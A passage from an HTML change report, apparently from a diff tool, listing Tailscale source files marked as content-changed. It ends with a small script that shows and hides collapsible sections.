atlabapp.arm64\config.json</td><td>内容变更</td></tr><tr><td>cmd\k8s-operator\testutils_test.go</td><td>内容变更</td></tr><tr><td>ipn\ipnserver\server.go</td><td>内容变更</td></tr><tr><td>ipn\ipnauth\ipnauth_windows.go</td><td>内容变更</td></tr><tr><td>net\captivedetection\captivedetection.go</td><td>内容变更</td></tr><tr><td>tstest\deptest\deptest.go</td><td>内容变更</td></tr><tr><td>cmd\tailscale\cli\set_test.go</td><td>内容变更</td></tr><tr><td>cmd\k8s-operator\ingress_test.go</td><td>内容变更</td></tr><tr><td>ipn\doc.go</td><td>内容变更</td></tr><tr><td>gokrazy\tsapp\config.json</td><td>内容变更</td></tr><tr><td>net\netcheck\netcheck_test.go</td><td>内容变更</td></tr><tr><td>cmd\tailscale\cli\debug.go</td><td>内容变更</td></tr><tr><td>appc\appconnector_test.go</td><td>内容变更</td></tr><tr><td>cmd\tailscaled\tailscaled_windows.go</td><td>内容变更</td></tr><tr><td>types\logger\logger.go</td><td>内容变更</td></tr><tr><td>ssh\tailssh\incubator.go</td><td>内容变更</td></tr><tr><td>net\dns\manager_default.go</td><td>内容变更</td></tr><tr><td>net\captivedetection\endpoints.go</td><td>内容变更</td></tr><tr><td>cmd\tl-longchain\tl-longchain.go</td><td>内容变更</td></tr><tr><td>cmd\k8s-operator\deploy\manifests\operator.yaml</td><td>内容变更</td></tr><tr><td>tailcfg\tailcfg_clone.go</td><td>内容变更</td></tr><tr><td>ipn\localapi\debugderp.go</td><td>内容变更</td></tr><tr><td>ipn\localapi\localapi.go</td><td>内容变更</td></tr><tr><td>ipn\ipnlocal\serve.go</td><td>内容变更</td></tr><tr><td>net\portmapper\upnp_test.go</td><td>内容变更</td></tr><tr><td>words\tails.txt</td><td>内容变更</td></tr><tr><td>net\ktimeout\ktimeout_linux_test.go</td><td>内容变更</td></tr><tr><td>client\systray\systray.go</td><td>内容变更</td></tr><tr><td>control\controlhttp\constants.go</td><td>内容变更</td></tr><tr><td>net\netmon\netmon.go</td><td>内容变更</td></tr><tr><td>wgengine\wgcfg\nmcfg\nmcfg.go</td><td>内容变更</td></tr><tr><td>client\tailscale\keys.go</td><td>内容变更</td></tr><tr><td>util\syspolicy\internal\internal.go</td><td>内容变更</td></tr><tr><td>cmd\testwrapper\flakytest\flakytest.go</td><td>内容变更</td></tr><tr><td>client\tailscale\routes.go</td><td>内容变更</td></tr><tr><td>k8s-operator\apis\v1alpha1\types_proxygroup.go</td><td>内容变更</td></tr><tr><td>types\prefs\item.go</td><td>内容变更</td></tr><tr><td>types\prefs\struct_list.go</td><td>内容变更</td></tr><tr><td>cmd\tsconnect\common.go</td><td>内容变更</td></tr><tr><td>cmd\k8s-operator\e2e\main_test.go</td><td>内容变更</td></tr><tr><td>kube\kubetypes\types.go</td><td>内容变更</td></tr><tr><td>tsnet\tsnet_test.go</td><td>内容变更</td></tr><tr><td>licenses\windows.md</td><td>内容变更</td></tr><tr><td>util\syspolicy\policy_keys.go</td><td>内容变更</td></tr><tr><td>client\web\web.go</td><td>内容变更</td></tr><tr><td>tempfork\gliderlabs\ssh\options_test.go</td><td>内容变更</td></tr><tr><td>cmd\k8s-operator\deploy\crds\tailscale.com_proxygroups.yaml</td><td>内容变更</td></tr><tr><td>control\controlclient\map.go</td><td>内容变更</td></tr><tr><td>ipn\ipnauth\test_actor.go</td><td>内容变更</td></tr><tr><td>cmd\k8s-operator\ingress-for-pg_test.go</td><td>内容变更</td></tr><tr><td>ipn\ipnlocal\state_test.go</td><td>内容变更</td></tr><tr><td>util\syspolicy\setting\raw_item.go</td><td>内容变更</td></tr><tr><td>ipn\store\store_aws.go</td><td>内容变更</td></tr><tr><td>cmd\vnet\vnet-main.go</td><td>内容变更</td></tr><tr><td>wgengine\userspace.go</td><td>内容变更</td></tr><tr><td>.github\workflows\update-webclient-prebuilt.yml</td><td>内容变更</td></tr><tr><td>types\prefs\struct_map.go</td><td>内容变更</td></tr><tr><td>ssh\tailssh\tailssh_integration_test.go</td><td>内容变更</td></tr><tr><td>types\prefs\prefs_test.go</td><td>内容变更</td></tr><tr><td>cmd\containerboot\metrics.go</td><td>内容变更</td></tr><tr><td>tailcfg\tailcfg.go</td><td>内容变更</td></tr><tr><td>wgengine\netstack\netstack.go</td><td>内容变更</td></tr><tr><td>cmd\containerboot\main.go</td><td>内容变更</td></tr><tr><td>types\netmap\netmap.go</td><td>内容变更</td></tr><tr><td>types\opt\value.go</td><td>内容变更</td></tr><tr><td>client\tailscale\dns.go</td><td>内容变更</td></tr><tr><td>build_docker.sh</td><td>内容变更</td></tr><tr><td>cmd\proxy-to-grafana\proxy-to-grafana.go</td><td>内容变更</td></tr><tr><td>wgengine\magicsock\magicsock.go</td><td>内容变更</td></tr><tr><td>tsweb\promvarz\promvarz.go</td><td>内容变更</td></tr><tr><td>tstest\natlab\vnet\conf.go</td><td>内容变更</td></tr><tr><td>cmd\k8s-operator\depaware.txt</td><td>内容变更</td></tr><tr><td>licenses\tailscale.md</td><td>内容变更</td></tr><tr><td>net\portmapper\upnp.go</td><td>内容变更</td></tr><tr><td>.github\workflows\codeql-analysis.yml</td><td>内容变更</td></tr><tr><td>client\tailscale\apitype\apitype.go</td><td>内容变更</td></tr><tr><td>derp\derphttp\derphttp_server.go</td><td>内容变更</td></tr><tr><td>ipn\ipnlocal\network-lock.go</td><td>内容变更</td></tr><tr><td>cmd\derper\depaware.txt</td><td>内容变更</td></tr><tr><td>tempfork\gliderlabs\ssh\options.go</td><td>内容变更</td></tr><tr><td>client\tailscale\tailnet.go</td><td>内容变更</td></tr><tr><td>tempfork\gliderlabs\ssh\tcpip.go</td><td>内容变更</td></tr><tr><td>wgengine\magicsock\derp.go</td><td>内容变更</td></tr><tr><td>ipn\store\awsstore\store_aws.go</td><td>内容变更</td></tr><tr><td>net\tstun\tun.go</td><td>内容变更</td></tr><tr><td>types\views\views.go</td><td>内容变更</td></tr><tr><td>net\tstun\linkattrs_notlinux.go</td><td>内容变更</td></tr><tr><td>tempfork\gliderlabs\ssh\session.go</td><td>内容变更</td></tr><tr><td>wgengine\magicsock\endpoint.go</td><td>内容变更</td></tr><tr><td>cmd\k8s-operator\ingress.go</td><td>内容变更</td></tr><tr><td>net\dns\manager.go</td><td>内容变更</td></tr><tr><td>client\tailscale\devices.go</td><td>内容变更</td></tr><tr><td>cmd\tailscale\cli\file.go</td><td>内容变更</td></tr><tr><td>clientupdate\clientupdate.go</td><td>内容变更</td></tr><tr><td>tstest\integration\tailscaled_deps_test_freebsd.go</td><td>内容变更</td></tr><tr><td>types\prefs\list.go</td><td>内容变更</td></tr><tr><td>types\prefs\map.go</td><td>内容变更</td></tr><tr><td>tstest\integration\tailscaled_deps_test_darwin.go</td><td>内容变更</td></tr><tr><td>cmd\tailscale\cli\serve_legacy.go</td><td>内容变更</td></tr><tr><td>gokrazy\build.go</td><td>内容变更</td></tr><tr><td>ipn\ipnserver\server_test.go</td><td>内容变更</td></tr><tr><td>ipn\ipnlocal\serve_test.go</td><td>内容变更</td></tr><tr><td>licenses\apple.md</td><td>内容变更</td></tr><tr><td>cmd\containerboot\serve_test.go</td><td>内容变更</td></tr><tr><td>safesocket\safesocket_plan9.go</td><td>内容变更</td></tr><tr><td>cmd\k8s-operator\tsclient.go</td><td>内容变更</td></tr><tr><td>net\routetable\routetable_other.go</td><td>内容变更</td></tr><tr><td>client\web\web_test.go</td><td>内容变更</td></tr><tr><td>tempfork\gliderlabs\ssh\context.go</td><td>内容变更</td></tr><tr><td>.github\workflows\update-flake.yml</td><td>内容变更</td></tr><tr><td>control\controlclient\controlclient_test.go</td><td>内容变更</td></tr><tr><td>.github\workflows\golangci-lint.yml</td><td>内容变更</td></tr><tr><td>net\tlsdial\tlsdial.go</td><td>内容变更</td></tr><tr><td>appc\appctest\appctest.go</td><td>内容变更</td></tr><tr><td>.github\workflows\test.yml</td><td>内容变更</td></tr><tr><td>derp\derp_server.go</td><td>内容变更</td></tr><tr><td>safesocket\safesocket.go</td><td>内容变更</td></tr><tr><td>net\tstun\linkattrs_linux.go</td><td>内容变更</td></tr><tr><td>ipn\ipnlocal\cert_test.go</td><td>内容变更</td></tr><tr><td>tstest\integration\tailscaled_deps_test_linux.go</td><td>内容变更</td></tr><tr><td>net\netmon\netmon_darwin.go</td><td>内容变更</td></tr><tr><td>tsnet\tsnet.go</td><td>内容变更</td></tr><tr><td>cmd\tta\tta.go</td><td>内容变更</td></tr><tr><td>ipn\ipnlocal\cert.go</td><td>内容变更</td></tr><tr><td>tempfork\acme\acme_test.go</td><td>内容变更</td></tr><tr><td>ipn\ipnlocal\local.go</td><td>内容变更</td></tr><tr><td>client\tailscale\acl.go</td><td>内容变更</td></tr><tr><td>util\syspolicy\setting\snapshot.go</td><td>内容变更</td></tr><tr><td>tstest\natlab\vnet\vnet.go</td><td>内容变更</td></tr><tr><td>cmd\containerboot\services.go</td><td>内容变更</td></tr><tr><td>cmd\stund\depaware.txt</td><td>内容变更</td></tr><tr><td>tempfork\gliderlabs\ssh\ssh.go</td><td>内容变更</td></tr><tr><td>prober\derp.go</td><td>内容变更</td></tr><tr><td>cmd\tailscale\cli\up.go</td><td>内容变更</td></tr><tr><td>cmd\tsidp\tsidp.go</td><td>内容变更</td></tr><tr><td>ipn\ipnlocal\web_client_stub.go</td><td>内容变更</td></tr><tr><td>control\controlhttp\client.go</td><td>内容变更</td></tr><tr><td>tstest\integration\integration_test.go</td><td>内容变更</td></tr><tr><td>cmd\derpprobe\derpprobe.go</td><td>内容变更</td></tr><tr><td>ipn\ipnserver\actor.go</td><td>内容变更</td></tr><tr><td>cmd\k8s-operator\sts_test.go</td><td>内容变更</td></tr><tr><td>prober\prober.go</td><td>内容变更</td></tr><tr><td>safesocket\safesocket_darwin.go</td><td>内容变更</td></tr><tr><td>tempfork\acme\http.go</td><td>内容变更</td></tr><tr><td>cmd\k8s-operator\proxygroup_test.go</td><td>内容变更</td></tr><tr><td>cmd\gitops-pusher\gitops-pusher.go</td><td>内容变更</td></tr><tr><td>envknob\featureknob\featureknob.go</td><td>内容变更</td></tr><tr><td>cmd\k8s-operator\svc.go</td><td>内容变更</td></tr><tr><td>VERSION.txt</td><td>内容变更</td></tr><tr><td>cmd\tailscale\depaware.txt</td><td>内容变更</td></tr><tr><td>tempfork\acme\acme.go</td><td>内容变更</td></tr><tr><td>disco\disco_test.go</td><td>内容变更</td></tr><tr><td>version\prop.go</td><td>内容变更</td></tr><tr><td>k8s-operator\api.md</td><td>内容变更</td></tr><tr><td>cmd\k8s-operator\deploy\crds\tailscale.com_proxyclasses.yaml</td><td>内容变更</td></tr><tr><td>util\syspolicy\internal\metrics\metrics.go</td><td>内容变更</td></tr><tr><td>cmd\tailscale\cli\set.go</td><td>内容变更</td></tr><tr><td>cmd\tailscale\cli\funnel.go</td><td>内容变更</td></tr><tr><td>cmd\testwrapper\flakytest\flakytest_test.go</td><td>内容变更</td></tr><tr><td>util\osuser\user.go</td><td>内容变更</td></tr><tr><td>cmd\containerboot\settings.go</td><td>内容变更</td></tr><tr><td>net\dns\config.go</td><td>内容变更</td></tr><tr><td>k8s-operator\apis\v1alpha1\types_proxyclass.go</td><td>内容变更</td></tr><tr><td>cmd\natc\natc.go</td><td>内容变更</td></tr><tr><td>scripts\installer.sh</td><td>内容变更</td></tr><tr><td>gokrazy\natlabapp\config.json</td><td>内容变更</td></tr><tr><td>tstest\integration\tailscaled_deps_test_windows.go</td><td>内容变更</td></tr><tr><td>cmd\k8s-operator\proxygroup_specs.go</td><td>内容变更</td></tr><tr><td>cmd\k8s-operator\proxygroup.go</td><td>内容变更</td></tr><tr><td>tailcfg\tailcfg_test.go</td><td>内容变更</td></tr><tr><td>ssh\tailssh\user.go</td><td>内容变更</td></tr><tr><td>cmd\hello\hello.go</td><td>内容变更</td></tr><tr><td>tsd\tsd.go</td><td>内容变更</td></tr><tr><td>net\netcheck\netcheck.go</td><td>内容变更</td></tr><tr><td>control\controlclient\auto.go</td><td>内容变更</td></tr><tr><td>cmd\ssh-auth-none-demo\ssh-auth-none-demo.go</td><td>内容变更</td></tr><tr><td>cmd\tailscale\cli\serve_legacy_test.go</td><td>内容变更</td></tr><tr><td>ipn\store\kubestore\store_kube.go</td><td>内容变更</td></tr><tr><td>appc\appconnector.go</td><td>内容变更</td></tr><tr><td>types\netmap\nodemut.go</td><td>内容变更</td></tr><tr><td>ipn\ipnlocal\web_client.go</td><td>内容变更</td></tr><tr><td>client\systray\logo.go</td><td>内容变更</td></tr><tr><td>net\netmon\state.go</td><td>内容变更</td></tr><tr><td>cmd\testwrapper\testwrapper.go</td><td>内容变更</td></tr><tr><td>ipn\conf.go</td><td>内容变更</td></tr><tr><td>tempfork\acme\types.go</td><td>内容变更</td></tr><tr><td>tstest\integration\tailscaled_deps_test_openbsd.go</td><td>内容变更</td></tr><tr><td>kube\kubeapi\api.go</td><td>内容变更</td></tr><tr><td>types\prefs\prefs.go</td><td>内容变更</td></tr><tr><td>types\bools\bools_test.go</td><td>内容变更</td></tr><tr><td>util\osuser\group_ids.go</td><td>内容变更</td></tr><tr><td>ipn\ipnlocal\network-lock_test.go</td><td>内容变更</td></tr><tr><td>ipn\ipn_clone.go</td><td>内容变更</td></tr><tr><td>.golangci.yml</td><td>内容变更</td></tr><tr><td>tsweb\promvarz\promvarz_test.go</td><td>内容变更</td></tr><tr><td>net\tstun\tstun_stub.go</td><td>内容变更</td></tr><tr><td>net\captivedetection\captivedetection_test.go</td><td>内容变更</td></tr><tr><td>cmd\k8s-operator\dnsrecords_test.go</td><td>内容变更</td></tr><tr><td>ipn\ipnlocal\profiles_test.go</td><td>内容变更</td></tr><tr><td>cmd\k8s-operator\deploy\chart\templates\operator-rbac.yaml</td><td>内容变更</td></tr><tr><td>cmd\pgproxy\pgproxy.go</td><td>内容变更</td></tr>
+                    </table>
+                </div>
+                
+            </div>
+            
+            <script>
+                // 初始化所有content的样式为隐藏
+                document.addEventListener('DOMContentLoaded', function() {
+                    var contents = document.querySelectorAll('.content');
+                    for (var i = 0; i < contents.length; i++) {
+                        contents[i].style.display = "none";
+                    }
+                });
+                
+                var coll = document.getElementsByClassName("collapsible");
+                for (var i = 0; i < coll.length; i++) {
+                    coll[i].addEventListener("click", function(e) {
+                        // 阻止按钮的默认行为，防止页面刷新
+                        e.preventDefault();
+                        this.classList.toggle("active");
+                        var content = this.nextElementSibling;
+                        if (content.style.display === "block") {
+                            content.style.display = "none";
+                        } else {
+                            content.style.display = "block";
+                        }
+                    });
+                }
+            </script>
+        </body>
+        </html>
+        
